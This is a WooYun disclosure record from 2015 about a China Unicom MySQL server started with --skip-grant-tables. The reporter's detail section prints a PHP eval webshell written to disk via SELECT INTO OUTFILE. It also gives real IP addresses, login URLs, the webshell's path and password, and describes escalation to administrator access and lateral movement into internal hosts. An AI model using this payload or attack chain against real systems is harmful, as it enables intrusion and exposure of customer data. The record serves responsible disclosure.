{"id": 20378, "wybug_id": "wooyun-2015-0114778", "wybug_title": "中国联通某处Mysql配置不当引发的问题（涉及联通电子工单系统、泛微协同办公、智能综合办公系统）", "wybug_corp": "中国联通", "wybug_author": "路人甲", "wybug_date": "2015-05-18 16:19", "wybug_open_date": "2015-07-06 19:20", "wybug_type": "系统/服务运维配置不当", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["安全意识不足"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-05-18：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-05-22：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-06-01：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-06-11：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-06-21：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-07-06：\t细节向公众公开  简要描述： 由于管理员疏忽导致mysql以 --skip-grant-tables 参数启动可以控制联通电子工单系统（内含几十万客户信息）泛微协同办公智能综合办公系统 详细说明：  相关单位，吉林省延边州联通，由于管理员疏忽导致mysql以 --skip-grant-tables 参数启动，导致可以使用任意账户登录mysql服务器，进而可以mysql into outfile一句话webshell系统地址工单系统\nhttp://202.111.175.199/system/login.php\n泛微\nhttp://202.111.175.199:8888/login.php\n智能综合办公系统http://202.111.175.199:8000/   漏洞证明：  端口扫描\n202.111.175.199\n\n\n扫描到了3306和3336端口，对其进行简单弱口令测试后发现可以登录3336端口，以任意身份登录\n\n通过mysql导出一句话到大马导出一句话\nselect \"<?php @eval($_POST['pass']);?>\" into outfile 'D:/www/wooyun.php';\n然后利用小马上传webshell地址\nhttp://202.111.175.199/inf0.php\n密码angel进而利用system权限webshell获取administrator密码登录3389\n\n利用管理员留存的mysql管理器我们看看里面有什么\n\n通过分析该服务器得知数据库\nxin\n为工单系统数据库获取管理员密码登录工单系统\n\n查看客户信息\n\n进入详情\n\n泛微和通达OA就不进行登录演示了，虽然我解不开管理员密码，但是我都有服务端了，我可以重置它密码。泛微和通达OA里面的信息可能会涉及联通一些敏感业务，所以也就不再继续了！顺便利用相似口令我们还可以登录内网的192.168.0.4\n\n192.168.0.5\n\n   修复方案：     版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：14  确认时间：2015-05-22 19:19 厂商回复： CNVD确认所述情况,已经转由CNCERT下发给吉林分中心,由其后续协调网站管理单位处置。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 14, "Ranks": null}